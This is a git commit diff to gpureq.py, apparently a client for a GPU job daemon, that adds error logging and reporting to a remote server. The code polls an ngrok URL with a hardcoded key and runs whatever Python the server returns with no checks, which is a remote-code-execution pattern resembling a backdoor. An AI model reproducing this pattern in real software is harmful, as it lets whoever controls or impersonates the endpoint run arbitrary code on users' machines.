cd41e0e93d92fe741b6dee7224b5d84e75e0c399
Bilal <103607205+AczeroCoder@users.noreply.github.com>
2023-05-24 02:35:40 +0100

    Update gpureq.py

--- gpureq.py
+++ gpureq.py
@@ -2,25 +2,47 @@ import requests
 import subprocess
 import json
 import os
+import logging
+import traceback
 
 api_key = "3412423422" # test api key
 source = "https://9fd4-90-211-254-60.ngrok-free.app"
 
-# Ping the server
-response = requests.post(source + '/daemon_check', headers={'X-Api-Key': api_key})
+# Set up logging
+logging.basicConfig(filename='error_log.log', level=logging.ERROR)
 
-# If the response contains instructions
-if response.status_code == 200:
-    instructions = response.json()
+def log_and_send_error(exc):
+    error_message = str(exc)
+    logging.error(error_message)
+    error_traceback = traceback.format_exc()
+    logging.error(error_traceback)
+    send_error_to_backend(error_message, error_traceback)
 
-    # If the instruction is to run a script
-    if instructions['type'] == 'SCRIPT':
-        script = instructions['code']
-        with open('temp.py', 'w') as f:
-            f.write(script)
-        subprocess.run(["python3", "temp.py"])
-        
-        # Delete the temporary file after running the script
-        os.remove("temp.py")
-    elif instructions['type'] == 'PING':
-        print("PINGGG")
+def send_error_to_backend(message, traceback):
+    # Implement the sending of the error details to the backend
+    payload = {'message': message, 'traceback': traceback}
+    response = requests.post(source + '/error_log', headers={'X-Api-Key': api_key}, json=payload)
+    # Check the response if necessary
+
+try:
+    # Ping the server
+    response = requests.post(source + '/daemon_check', headers={'X-Api-Key': api_key})
+
+    # If the response contains instructions
+    if response.status_code == 200:
+        instructions = response.json()
+
+        # If the instruction is to run a script
+        if instructions['type'] == 'SCRIPT':
+            script = instructions['code']
+            with open('temp.py', 'w') as f:
+                f.write(script)
+            subprocess.run(["python3", "temp.py"])
+            
+            # Delete the temporary file after running the script
+            os.remove("temp.py")
+        elif instructions['type'] == 'PING':
+            print("PINGGG")
+
+except Exception as e:
+    log_and_send_error(e)
